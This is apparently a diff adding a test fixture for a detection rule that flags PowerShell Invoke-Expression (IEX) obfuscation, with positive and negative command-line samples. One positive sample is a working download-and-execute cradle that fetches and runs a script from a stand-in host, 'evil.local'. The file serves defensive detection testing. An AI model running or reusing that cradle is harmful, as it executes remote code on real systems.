@@ -1,0 +1,26 @@
+rule: ps-obfusc-002
+
+positive:
+  - description: Classic IEX one-liner
+    event:
+      commandline: "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.local/x.ps1')\""
+  - description: Full Invoke-Expression form
+    event:
+      commandline: 'powershell.exe Invoke-Expression $script'
+  - description: iex alias lowercase with space
+    event:
+      commandline: 'powershell.exe iex $cmd'
+  - description: IEX with parenthesis
+    event:
+      commandline: 'powershell.exe IEX(Get-Content payload.ps1)'
+
+negative:
+  - description: Module name containing IEX (e.g. ExcEX module)
+    event:
+      commandline: 'powershell.exe Import-Module IEXModule'
+  - description: Plain expression no IEX
+    event:
+      commandline: 'powershell.exe Get-Process'
+  - description: cmd.exe with unrelated content
+    event:
+      commandline: 'cmd.exe /c notepad.exe'
